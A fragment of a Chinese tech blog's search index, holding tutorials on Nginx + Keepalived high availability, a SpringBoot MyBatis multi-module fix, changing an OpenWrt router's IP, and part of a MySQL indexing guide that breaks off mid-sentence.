"https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"缓存"},{title:"Nginx + Keepalived 实现双机主备高可用",url:"/posts/503c34e4.html",text:'前言负载均衡的实现 TCP 层实现的负载均衡，例如：LVS（调度性能强悍） 应用层实现的负载均衡，例如：Nginx、Haproxy、Apache (mod_proxy)、Varnish、Squid、Ribbon Keepalived 概述Keepalived 简介 Keepalived 是 Linux 下一个轻量级别的高可用开源解决方案，高可用 (High Avalilability)，其实两种不同的含义：广义来讲，是指整个系统的高可用行，狭义的来讲就是之主机的冗余和接管，它与 HeartBeat RoseHA 实现相同类似的功能，都可以实现服务或者网络的高可用；但是又有差别，HeartBeat 是一个专业的、功能完善的高可用软件，它提供了 HA 软件所需的基本功能，比如：心跳检测、资源接管、检测集群中的服务、在集群节点转移共享 IP 地址的所有者等等。HeartBeat 功能强大，但是部署和使用相对比较麻烦，与 HeartBeat 相比，Keepalived 主要是通过虚拟路由冗余来实现高可用功能，虽然它没有 HeartBeat 功能强大，但是 Keepalived 部署和使用非常的简单，所有配置只需要一个配置文件即可以完成。Keepalived 实现了轻量级的高可用，一般用于前端高可用，且不需要共享存储，一般常用于两个节点的高可用。而 Heartbeat 用于服务的高可用，且需要共享存储，一般用于多节点的高可用。 Keepalived 起初是专为 LVS 设计的，用来管理并监控 LVS 集群系统中各个服务节点的状态，后来又加入了可以实现高可用的 VRRP 功能。因此，Keepalived 除了能够管理 LVS 软件外，还可以实现任意两台主机之间，例如 Master 和 Backup 主机之间的故障转移和自动切换，这个主机可以是普通的不能停机的业务服务器，也可以是 LVS 负载均衡、Nginx 反向代理这样的服务器。Keepalived 软件主要是通过 VRRP 协议实现高可用功能的，VRRP 是 Virtual Router Redundancy Protocol（虚拟路由冗余协议）的缩写，VRRP 出现的目的就是为了解决静态路由的单点故障问题的，它能保证当个别节点宕机时，整个网络可以不间断、稳定地运行。所以，Keepalived 一方面具有配置管理 LVS 的功能，同时还具有对 LVS 下面节点进行健康检查的功能，另一方面也可以实现系统网络服务的高可用功能。 VRRP 协议与工作原理 在现实的网络环境中，主机之间的通信都是通过配置静态路由或者 (默认网关) 来完成的，而主机之间的路由器一旦发生故障，通信就会失效，因此这种通信模式当中，路由器就成了一个单点瓶颈，为了解决这个问题，就引入了 VRRP 协议，它是一种主备模式的协议，通过 VRRP 可以在网络发生故障时透明的进行设备切换而不影响主机之间的数据通信，这其中涉及到两个概念：物理路由器和虚拟路由器。 VRRP 可以将两台或者多台物理路由器设备虚拟成一个虚拟路由，这个虚拟路由器通过虚拟 IP（一个或者多个) 对外提供服务，而在虚拟路由器内部十多个物理路由器协同工作，同一时间只有一台物理路由器对外提供服务，这台物理路由设备被成为：主路由器（Master 角色)，一般情况下 Master 是由选举算法产生，它拥有对外服务的虚拟 IP，提供各种网络功能，如：ARP 请求，ICMP 数据转发等，而且其它的物理路由器不拥有对外的虚拟 IP，也不提供对外网络功能，仅仅接收 MASTER 的 VRRP 状态通告信息，这些路由器被统称为 “BACKUP 的角色”，当主路由器失败时，处于 BACKUP 角色的备份路由器将重新进行选举，产生一个新的主路由器进入 MASTER 角色，继续提供对外服务，整个切换对用户来说是完全透明的。 每个虚拟路由器都有一个唯一的标识号，称为 VRID，一个 VRID 与一组 IP 地址构成一个虚拟路由器，在 VRRP 协议中，所有的报文都是通过 IP 多播方式发送的，而在一个虚拟路由器中，只有处于 Master 角色的路由器会一直发送 VRRP 数据包，处于 BACKUP 角色的路由器只会接受 Master 角色发送过来的报文信息，用来监控 Master 运行状态，一般不会发生 BACKUP 抢占的情况，除非它的优先级更高，而当 MASTER 不可用时，BACKUP 也就无法收到 Master 发过来的信息，于是就认定 Master 出现故障，接着多台 BAKCUP 就会进行选举，优先级最高的 BACKUP 将称为新的 MASTER，这种选举角色切换非常之快（&lt; 1s），因而保证了服务的持续可用性。 Keepalvied 的工作原理 Keepalived 通过 VRRP 实现高可用，作为一个高性能集群软件，它还能实现对集群中服务器运行状态的监控以及故障隔离。Keepalived 工作在 TCP/IP 参考模型的 三层、四层、五层，也就是分别为：网络层，传输层和应用层，根据 TCP、IP 参数模型隔层所能实现的功能，Keepalived 运行机制如下： 在网络层： 运行 4 个重要的协议：互联网络 IP 协议，互联网络可控制报文协议 ICMP、地址转换协议 ARP、反向地址转换协议 RARP，Keepalived 在网络层采用最常见的工作方式是通过 ICMP 协议向服务器集群中的每一个节点发送一个 ICMP 数据包 (有点类似与 Ping 的功能)， 如果某个节点没有返回响应数据包，那么认为该节点发生了故障，Keepalived 将报告这个节点失效，并从服务器集群中剔除故障节点； 在传输层： 提供了两个主要的协议：传输控制协议 TCP 和用户数据协议 UDP，传输控制协议 TCP 可以提供可靠的数据输出服务、 IP 地址和端口，代表 TCP 的一个连接端，要获得 TCP 服务，需要在发送机的一个端口和接收机的一个端口上建立连接，而 Keepalived 在传输层里利用了 TCP 协议的端口连接和扫描技术来判断集群节点的端口是否正常，比如对于常见的 WEB 服务器 80 端口。或者 SSH 服务 22 端口，Keepalived 一旦在传输层探测到这些端口号没有数据响应和数据返回，就认为这些端口发生异常，然后强制将这些端口所对应的节点从服务器集群中剔除掉； 在应用层：可以运行 FTP，TELNET，SMTP，DNS 等各种不同类型的高层协议，Keepalived 的运行方式也更加全面化和复杂化，用户可以通过自定义 Keepalived 工作方式，例如：可以通过编写程序或者脚本来运行 Keepalived，而 Keepalived 将根据用户的设定参数检测各种程序或者服务是否允许正常，如果 Keepalived 的检测结果和用户设定的不一致时，Keepalived 将把对应的服务器从服务器集群中剔除； Keepalived 高可用服务对之间的故障切换转移，是通过 VRRP 来实现的。在 Keepalived 服务工作时，主 Master 节点会不断地向备节点发送（多播的方式）心跳消息，用来告诉备 Backup 节点自己还活着。当主节点发生故障时，就无法发送心跳的消息了，备节点也因此无法继续检测到来自主节点的心跳了。于是就会调用自身的接管程序，接管主节点的 IP 资源和服务。当主节点恢复时，备节点又会释放主节点故障时自身接管的 IP 资源和服务，恢复到原来的备用角色。 Keepalived 的体系结构 简单模块介绍： 1）SchedulerI/OMultiplexer 是一个 I/O 复用分发调度器，它负载安排 Keepalived 所有内部的任务请求 2）Memory Mngt 是一个内存管理机制，这个框架提供了访问内存的一些通用方法 3）Control Plane 是 Keepalived 的控制版面，可以实现对配置文件编译和解析 4）Core componets 这部分主要包含了 5 个部分 a）看门狗 (Watchdog) ：是计算机可靠领域中极为简单又非常有效的检测工具，Keepalived 正是通过它监控 Checkers 和 VRRP 进程的 b）检查者 (Checkers) : 是 Keepalived 最基础、最主要的功能，可以实现对服务器运行状态检测和故障隔离 c）VRRP 模块 (VRRP Stack) : 是 Keepalived 引用 VRRP 功能，可以实现 HA 集群中失败切换功能，负责负载均衡器之间的失败切换 FailOver d）IPVS 模块 (IPVS wrapper) : 是 IPVS 功能的一个实现，IPVSwarrper 模块将可以设置好的 IPVS 规则发送的内核空间并且提供给 IPVS 模块，最终实现 IPVS 模块的负载功能 e）VIP 切换 (Netlink Reflector) ：用来实现高可用集群 Failover 时虚拟 IP (VIP) 的设置和切换 由上图可知，两个子进程都被系统 WatchDog 看管，healthchecker 子进程实现检查各自服务器的健康程度，例如 HTTP、LVS 等等，如果 healthchecker 子进程检查到 MASTER 上服务不可用，就会通知本机上的兄弟 VRRP 子进程，让它删除通告，并且去掉虚拟 IP，转换为 BACKUP 状态 Nginx + Keepalived 搭建高可用集群部署架构图本文采用的是 Nginx + Keepalived 双机主备架构（主从模式），即使用一个 VIP 地址，Nginx 使用 2 台机器，一台做主节点（Master），一台做备节点（Backup），但同时只有一台机器工作，另一台备用机器在主机器不出现故障的时候，处于空闲状态，仅仅用于灾备。 服务器规划 角色 IP 软件 运行环境 Master 节点 192.168.1.163 CentOS 7、Nginx、Keepalived Vbox 虚拟机 Backup 节点 192.168.1.109 CentOS 7、Nginx、Keepalived VBox 虚拟机 准备工作关闭防火墙 12345# 临时关闭# systemctl stop firewalld# 永久关闭# systemctl disable firewalld 关闭 selinux 12345# 临时关闭# setenforce 0# 永久关闭# sed -i \'s/enforcing/disabled/\' /etc/selinux/config 软件安装要求在 Master 与 Backup 节点上都安装好 Nginx 和 Keepalived，建议使用编译安装的方式。在生产环境中，Nginx 与 Keepalived 也可以安装在不用的物理机器上。 Nginx 编译安装12345# 创建nginx用户组# groupadd nginx# 创建nginx用户（不允许远程登录）# useradd -g nginx nginx -s /bin/false 12# 安装依赖# yum install -y gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel 1234567891011121314151617181920212223242526272829303132# 下载# wget http://nginx.org/download/nginx-1.17.1.tar.gz# 解压# tar -xvf nginx-1.17.1.tar.gz# 进入解压目录# cd nginx-1.17.1# 配置./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-pcre \\ --with-http_v2_module \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module# 编译安装# make &amp;&amp; make install# 后台启动Nginx# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf# 验证访问Nginx# curl -X GET 127.0.0.1# 查看Nginx的运行状态# ps -aux|grep nginx Keepalived 编译安装12# 安装依赖# yum -y install curl gcc libnl3-devel net-snmp-devel libnl libnl-devel libnfnetlink-devel openssl openssl-devel 1234567891011121314151617181920212223242526272829303132## Keepalived官网下载地址：https://www.keepalived.org/download.html# 下载# wget http://keepalived.org/software/keepalived-2.0.18.tar.gz# 解压# tar -xvf keepalived-2.0.18.tar.gz# 进入解压目录# cd keepalived-2.0.18# 配置# ./configure --prefix=/usr/local/keepalived# 确保 "./configure" 命令执行完后，输出的以下支持项都为Yesfwmark socket support : YesUse VRRP Framework : YesUse VRRP VMAC : YesUse VRRP authentication : YesWith ip rules/routes : Yes# 编译安装# make &amp;&amp; make install# 创建存放Keepalived配置文件的目录# mkdir -p /etc/keepalived# 拷贝Keepalived默认的配置文件# cp /usr/local/keepalived/etc/keepalived/keepalived.conf /etc/keepalived# 设置Keepalived开机自启动# systemctl enable keepalived.service Keepalived 核心配置在 Makster 和 Backup 节点分别创建检查 Nginx 健康状态的脚本 /etc/keepalived/nginx_check.sh 123456789#!/bin/bashA=`ps -C nginx --no-header | wc -l`if [ $A -eq 0 ];then /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf sleep 2 if [ `ps -C nginx --no-header | wc -l` -eq 0 ];then killall keepalived fifi 12# 脚本授权执行# chmod +x /etc/keepalived/nginx_check.sh Keepalived 是服务器级别的，只监控服务器，Nginx 宕机了，是没有办法接管的。比如，这里是用 Nginx 做负载均衡分发请求的数据包的，如果 Master 节点的 Keepalived 服务正常运行，而 Nginx 运行异常，那么将会出现 Nginx 负载均衡服务失灵，无法切换到 Nginx 备用的负载均衡器上，后端的 Web 服务器无法收到请求。所以，应该要检测 Nginx 的服务是否正常运行，如果不是正常运行，首先尝试启动 Nginx 的服务；若 Nginx 重启失败，就应该关闭掉该节点上的 Keepalived 的服务，这样才能自动切换到 Keepalived 的 Backup 节点上。 Keepalived 的配置示例如下： 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc # 指定收件人 } # notification_email_from Alexandre.Cassen@firewall.loc # 指定发件人 # smtp_server 192.168.200.1 # SMTP服务器地址 # smtp_connect_timeout 30 # SMTP服务器连接超时时间 router_id LVS_1 # 必填，标识本节点的字符串，在不同的Keepalived服务器里唯一，通常为hostname，但不一定非得是hostname，故障发生时，发邮件通知时会用到 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" # 检测服务健康状态的Shell脚本 interval 2 # 每隔多长时间探测一次 weight -20 # 如果条件成立的话，则权重-20}vrrp_instance VI_1 { # 定义虚拟路由，VI_1为虚拟路由的标示符，可以是自定义名称，允许定义多个虚拟路由 state MASTER # 必填，可以是MASTER或BACKUP，不过当其他节点Keepalived启动时会将Priority比较大的节点选举为MASTER interface enp0s3 # 必填，节点固有IP（非VIP）的网卡，用来发VRRP包做心跳检测 mcast_src_ip 192.168.1.109 # 本机的IP virtual_router_id 51 # 必填，虚拟路由ID，取值在0-255之间，用来区分多个Instance的VRRP组播，同一网段内ID不能重复，主备机器的该值必须为一样 priority 100 # 必填，用来选举Master的，要成为Master那么这个选项的值最好高于其他机器50个点，该项取值范围是1-255(在此范围之外会被识别成默认值100) advert_int 1 # 必填，检查间隔默认为1秒，即1秒进行一次Master选举（可以认为是健康查检时间间隔） authentication { # 必填，认证区域，认证类型有PASS和HA（IPSEC），推荐使用PASS（密码只识别前8位），主备配置必须一样 auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 # 必填，虚拟VIP地址，建议后缀加上"/24"，允许有多个 } track_script { # 检测服务健康状态的Shell脚本 chk_nginx }} 在 Makster 节点创建 Keepalived 的主配置文件 /etc/keepalived/keepalived.conf，配置文件的内容如下： 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc } # notification_email_from Alexandre.Cassen@firewall.loc # smtp_server 192.168.200.1 # smtp_connect_timeout 30 router_id LVS_1 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" interval 2 weight -20}vrrp_instance VI_1 { state MASTER interface enp0s3 mcast_src_ip 192.168.1.163 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 } track_script { chk_nginx }} 在 Backup 节点创建 Keepalived 的主配置文件 /etc/keepalived/keepalived.conf，配置文件的内容如下，与 Master 节点的最大参数区别是：router_id LVS_2、state BACKUP、mcast_src_ip 192.168.1.109 1234567891011121314151617181920212223242526272829303132333435363738global_defs { notification_email { # acassen@firewall.loc } # notification_email_from Alexandre.Cassen@firewall.loc # smtp_server 192.168.200.1 # smtp_connect_timeout 30 router_id LVS_2 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0}vrrp_script chk_nginx { script "/etc/keepalived/nginx_check.sh" interval 2 weight -20}vrrp_instance VI_1 { state BACKUP interface enp0s3 virtual_router_id 51 mcast_src_ip 192.168.1.109 priority 90 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.1.186/24 } track_script{ chk_nginx }} 分别在 Master 节点和 Backup 节点启动 Keepalived 的服务 123456789# 启动Keepalived# service keepalived start# 查看运行状态# service keepalived status# 查看启动的日志信息# more /var/log/messages# journalctl -u keepalived 测试虚拟 IPMaster 节点查看虚拟 IP在 Master 节点执行以下命令，查看节点的 IP 状态 1# ip addr 在 Master 节点可以看到已经生成了虚拟 IP 192.168.1.186 Backup 节点查看虚拟 IP在 Backup 节点执行以下命令，查看节点的 IP 状态 1# ip addr 在 Backup 节点默认不会看到生成的虚拟 IP，如果生成那就是 Keepalived 的配置文件出现了错误，即备节点和主节点争用 IP 资源，这个现象叫做 脑裂 使用虚拟 IP 访问 Nginx分别在 Master 节点和 Backup 节点上，验证是否可通过虚拟 IP 访问本地的 Nginx 服务 12345# 确保可以Ping得通虚拟IP# ping 192.168.1.186# 访问Nginx# curl -X GET 192.168.1.186 值得一提的是，建议额外在宿主机上测试是否可以访问 VIP 主备服务器高可用切换关闭 Master 节点的 Keepalived 服务 1# service keepalived stop 查看 Backup 节点是否会生成虚拟 IP 192.168.1.186 重新启动 Master 的 Keepalived 服务，然后查看 Master 和 Backup 的虚拟 IP，此时主节点应该会将虚拟 IP 抢夺回来 1# service keepalived restar Keepalived 脑裂（主备节点均有 VIP）脑裂（split-brain）指在一个高可用（HA）系统中，当联系着的两个节点断开联系时，本来为一个整体的系统，分裂为两个独立节点，这时两个节点开始争抢共享资源，结果会导致系统混乱，数据损坏。对于无状态服务的 HA，无所谓脑裂不脑裂；但对有状态服务（比如 MySQL）的 HA，必须要严格防止脑裂。 脑裂原因一般来说脑裂问题有以下这几种原因： 高可用服务器上开启了 iptables 防火墙，阻止了心跳传消息输 高可用服务器上心跳网卡地址等信息配置不正确，导致发送心跳失败 其他服务配置不当的原因，如心跳方式不同，心跳广播冲突，软件 Bug 等 高可用服务器对之间心跳线链路发生故障，导致无法正常通信，例如：心跳线坏了（包括断了或者老化）、网卡及相关驱动损坏、IP 配置及冲突问题（网卡直连）、心跳线之间的设备故障（网卡及交换机）、仲裁的机器出现问题（采用仲裁的方案） 提示：Keepalived 配置里的同一个 VRRP 实例，如果 virtual_router_id 参数在主备节点上的配置不一致，也会导致出现脑裂现象 脑裂方案在实际生产环境中，可以从以下方面防止脑裂： 同时使用串行电缆和以太网电缆连接、同时使用两条心跳线路，这样一条线路断了，另外一条还是好的，依然能传送心跳消息 当检查脑裂时强行关闭一个心跳节点（这个功能需要特殊设备支持，如 stonith、fence）相当于备节点接收不到心跳消息，通过单独的线路发送关机命令关闭主节点的电源 做好对脑裂的监控报警 解决常见方案： 如果开启防火墙，一定要让心跳消息通过，一般通过允许 IP 段的形式解决 可以拉一条以太网网线或者串口线作为主被节点心跳线路的冗余 开发检测程序通过监控软件检测脑裂 脑裂报警脚本监控报警思路，正常情况下 Keepalived 的 VIP 是挂载在 Master 节点上的，如果在 Backup 节点发现了 VIP，同时还可以 Ping 得通 Master 节点，就触发脑裂报警。这种监控思路是假设在 Keepalived 服务自身不会宕机的基础上的，若 Master 节点上的 Keepalived 服务宕机了，VIP 会正常挂载到 Backup 节点上，同时还是可以 Ping 得通 Master 节点，这种极端情况下就会错误触发脑裂警报。 12345678910111213141516#!/bin/bash# 检查脑裂的脚本，在Backup节点上进行部署VIP=192.168.1.186MASTER_IP=192.168.1.163while truedo ping -c 2 -W 3 $MASTER_IP &amp;&gt;/dev/null if [ $? -eq 0 -a `ip add|grep "$VIP"|wc -l` -eq 1 ];then echo "ha is brain." else echo "ha is ok" fi sleep 5done Nginx + Keepalived 高可用部署架构方案 双机主备方案：就是上文介绍过的，使用一个 VIP 地址，前端使用 2 台机器，一台做主节点（Master），一台做备节点（Backup），但同时只有一台机器工作，另一台备用机器在主机器不出现故障的时候，永远处于浪费状态，仅仅用于灾备，平时都是空闲着的。 双主热备方案：弥补了双机主备的缺点，使用 2 个 VIP 地址，前端使用 2 台机器，彼此互为主备，同时有两台机器工作。用户访问之后，DNS 轮询选择访问哪个 VIP，当其中一台机器出现故障，两台机器的请求会转移到同一台机器负载。 FAQMaster 节点无法访问虚拟 IPMaster 节点里的 Keepalived 服务配置好 VIP 后，通过 ip addr 可以看到 VIP 已经顺利挂载，但是在 Master 节点内部无法 Ping 通。原因是 keepalived.conf 文件中默认配置了 vrrp_strict，需要把它注释掉，重启 Keepalived 的服务后即可以 Ping 得通。vrrp_strict 参数表示严格遵守 VRRP 协议，下列情况将会阻止 Keepalived 的虚拟 IP 功能： 1）单播邻居 2）没有 VIP 地址 3）在 VRRP 版本 2 中有 IPv6 地址 Backup 节点无法访问虚拟 IP虚拟 IP 的网段要和 Real Server 真实 IP 的网段地址一致，比如 Master 节点与 Backup 节点的 IP 网段为 192.168.171，那么虚拟 IP 必须是 192.168.171.*，否则 Backup 节点无法访问虚拟 IP。 Nginx 服务使用非默认的 80 端口若 Nginx 服务使用非默认的 80 端口，那么在 Keepalived 的配置文件 keepalived.conf 里，只需要正常配置 virtual_ipaddress 参数即可，不需要关心 Nginx 具体使用的是哪个端口，因为默认可以通过 http://vip:port 的地址格式访问 Nginx。 Master 节点与 Backup 节点同时生成了虚拟 IP关闭系统防火墙，让 Master 节点和 Backup 节点可以互相通信，否则会导致主备节点都生成了两个 VIP（脑裂现象）。也可以配置主备节点之间的防火墙协议（如下），开启其他需要通信的 IP 即可： 12345678# 开启VRRP协议# firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --protocol vrrp -j ACCEPT# 或者# firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface em1 --destination 192.168.1.163 --protocol vrrp -j ACCEPT# 重载配置生效# firewall-cmd --reload 商业云服务器对 Keepalived 的支持以阿里云服务器举例，可以使用 HAVIP + VPC（Virtual Private Cloud，虚拟私有云） 来实现 Keepalived，但是普通的 ECS 是不适用的，要求必须使用 VPC 类型的 ECS，而且虚拟 IP 需要另外申请（不支持自建 VIP）。阿里云目前不支持自建 LVS 高可用负载均衡，但有现成的商业产品–负载均衡 SLB 可以选择。值得一提的是，云服务器 ECS 不支持组播和广播，这点需要注意一下。 参考博客 Keepalived 配置文件参数详解 Keepalived 虚拟 VIP 无法访问的问题 Centos 8 开启防火墙后，脑裂的问题解决 基于华为云搭建 Keepalived + Nginx 实验 Nginx 高可用集群解决方案 Nginx + Keepalived Keepalived + Nginx 实现搭建双机主备 + 双主热备 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux web服务器"},{title:"SpringBoot 开发常见问题记录",url:"/posts/ba04f364.html",text:'MyBatis多模块下主模块无法注入子模块的 Mapper假设有 common 和 shop 两个模块，common 模块里有 MyBatis 的 Mapper 接口和 XML 映射文件，而 shop 模块则依赖了 common 模块，此时若在 shop 模块中无法注入 common 模块的 Mapper，则可以参考以下方法解决问题。 第一步，先确认主模块可以正常扫描到子模块的 XML 映射文件，YML 的内置内容如下： 12mybatis: mapper-locations: classpath*:/mapper/**/*.xml 提示 值得一提的是，在主模块的 application.yml 里面，配置 MyBatis 的 mapper-locations 时，若使用了 classpath，那么只会扫描当前模块的 XML 映射文件，而使用 classpath* 则会扫描所有 Jar 包下的 XML 映射文件。 第二步，在主模块的启动类上添加 @MapperScan 注解，这是为了可以扫描到子模块的的 Mapper 接口，而且被扫描到的 Mapper 接口，在编译之后都会自动生成相应的实现类。若子模块没有在主模块的启动类可以扫描的包或者子包下面，那么还需要在主模块的启动类上添加 @ComponentScan 注解，这样才能让 SpringBoot 扫描到子模块的其他 Bean 类，示例代码如下： 12345678package com.shop;@SpringBootApplication@MapperScan("com.common.**.mapper")@ComponentScan(basePackages = {"com.common"})public class ShopApplication { } 提示 @MapperScan("com.common.mapper")：扫描指定包中的接口 @MapperScan("com.common.*.mapper")：一个 * 代表任意字符串，但只代表一级包，比如可以扫到 com.common.aaa.mapper，不能扫到 com.common.aaa.bbb.mapper @MapperScan("com.common.**.mapper")：两个 * 代表任意数量的包，比如可以扫到 com.common.aaa.mapper，也可以扫到 com.common.aaa.bbb.mapper var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 开发随笔"},{title:"OpenWrt 设置 IP 地址",url:"/posts/ee7f1a35.html",text:'前言由于路由器的 IP 一般都是 192.168.1.1，当接入了二级路由器时，为了让二级路由器的 IP 不与一级路由器的 IP 冲突，此时一般需要更改二级路由器的 IP 地址，下面将介绍 OpenWrt 如何通过可视化界面和更改配置文件的方式来指定 IP 地址。 查看 OpenWrt 的 IP通过 SSH 连接到 OpenWrt 后，在终端输入 ifconfig 命令，可以看到 OpenWrt 默认的 IP 地址是 192.168.1.1。这里的 SSH 登录账号，一般是 OpenWrt 可视化管理界面的登录账号，用户名一般为 root。 通过配置文件更改 IP编辑配置文件 /etc/config/network，将 192.168.1.1 改为自定义的 IP 地址（例如：192.168.2.1），然后重启路由器即可。 12345678910# vim /etc/config/networkconfig interface \'lan\' option ifname \'eth0.1\' option force_link \'1\' option type \'bridge\' option proto \'static\' option ipaddr \'192.168.2.1\' option netmask \'255.255.255.0\' option ip6assign \'60\' (adsbygoogle = window.adsbygoogle || []).push({}); 通过可视化界面更改 IP菜单栏导航到：NetWork -&gt; Interfaces -&gt; LAN -&gt; General Setup，更改 IPv4 address 的 IP 地址，然后点击 保存 &amp; 应用 即可。 补充说明OpenWrt 重启后，通过 ifconfig 命令查询 IP 地址是否成功更改。值得注意的是，当二级路由器的网段更改后，那么通过 DHCP 分配给客户端设备的网段也会随着变更，例如当路由器的 IP 更改为 192.168.2.1，那么客户端设备的网段将更改为 192.168.2，同时 IP 地址为 192.168.2.xxx。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"树莓派"},{title:"MySQL 索引的使用",url:"/posts/ba389f6e.html",text:'索引介绍索引是一种特殊的文件（InnoDB 数据表上的索引是表空间的一个组成部分），包含了对数据表里所有记录的引用指针。索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索引包含多个列。创建索引时，需要确保该索引是应用在 SQL 查询语句的条件 (一般是 WHERE、JOIN 子句的条件)。 索引的类型（四种） FULLTEXT：即为全文索引，目前只有 MyISAM 引擎支持，其可以在 CREATE TABLE，ALTER TABLE，CREATE INDEX 使用，不过目前只有 CHAR、VARCHAR、TEXT 列上可以创建全文索引 HASH：由于 HASH 的唯一性及类似键值对的形式，很适合作为索引，HASH 索引可以一次定位，不需要像树形索引那样逐层查找，因此具有极高的效率。但是，这种高效是有条件的，即只在 “=” 和 “in” 条件下才高效，对于范围查询、排序及组合索引仍然效率不高 BTREE：一种将索引值按一定的算法，存入一个树形的数据结构中（二叉树），每次查询都是从树的入口 Root 开始，依次遍历 Node，获取 Leaf，这是 MySQL 里默认和最常用的索引类型 RTREE：在 MySQL 很少使用，仅支持 geometry 数据类型，支持该类型的存储引擎有 MyISAM、BDb、InnoDb、NDb、Archive，相对于 BTREE，RTREE 的优势在于范围查找 索引的种类（五种） 普通索引：仅加速查询（BTREE 类型） 全文索引：对文本的内容进行分词和搜索 唯一索引：加速查询 + 列值唯一（可以有 NULL 值） 主键索引：加速查询 + 列值唯一（不可以有 NULL 值） + 每个表只能有一个主键索引 组合索引：多列值组成一个索引，专门用于组合搜索，其效率大于索引合并（使用多个单列索引组合搜索） 索引的操作创建索引： 1234567891011--创建普通索引CREATE INDEX index_name ON table_name(col_name);--创建唯一索引CREATE UNIQUE INDEX index_name ON table_name(col_name);--创建普通组合索引CREATE INDEX index_name ON table_name(col_name_1, col_name_2);--创建唯一组合索引CREATE UNIQUE INDEX index_name ON table_name(col_name_1, col_name_2); 通过修改表结构创建索引： 1ALTER TABLE table_name ADD INDEX index_name(col_name); 创建表时直接指定索引： 12345CREATE TABLE table_name ( ID INT NOT NULL, col_name VARCHAR (16) NOT NULL, INDEX index_name(col_name)); 删除索引： 12345--直接删除索引DROP INDEX index_name ON table_name;--修改表结构删除索引ALTER TABLE table_name DROP INDEX index_name; 其它相关命令： 12345678910111213--查看表结构desc table_name;--查看创建表的SQLshow create table table_name;--查看索引show index from&nbsp;table_name;--查看执行时间set profiling = 1;SQL ...show profiles; 索引使用的代价 索引虽然可以大大提高了查询速度，但同时也会降低更新表的速度，如对表进行 INSERT、UPDATE 和 DELETE 操作；因为更新表时，MySQL 不仅要保存数据，还要更新索引文件 建立索引会占用更多的磁盘空间，这是因为需要分配磁盘空间给索引文件，一般情况这个问题不太严重，但如果在一个大表上创建了多种组合索引，索引文件的体积会膨胀得很快 索引适用的场景索引创建的时机一般来说，在 WHERE 和 JOIN 子句中出现的列需要建立索引，但也不完全如此，因为 MySQL 只对 &lt;、&lt;=、=、&gt;、&gt;=、BETWEEN、IN 以及某些时候的 LIKE 才会使用索引。例如下述的 SQL 语句，就需要对 city 和 age 列建立索引，由于 mytable_m 表的 userame 也出现在了 JOIN 子句中，因此也有对它建立索引的必要。 1SELECT t.Name FROM mytable_t LEFT JOIN mytable_m ON t.Name=m.username WHERE m.age=20 AND m.city=\'郑州\' ; 特别注意：上面提到只有某些时候的 LIKE 才需建立索引，因为在以通配符 % 开头作查询时，MySQL 不会使用索引；只有以通配符 % 结尾做查询时，MySQL 才会使用到索引。但有一种情况例外，那就是当触发了覆盖索引（select 的数据列只从索引中就能够取得，不必读取数据行，换句话说查询列要被所建的索引覆盖）的情况下，以通配符 % 开头作查询 MySQL 也会使用索引。例如：如果表里面只有 id 和 username 两个字段且都加了索引，那么 select * like \'%username\' 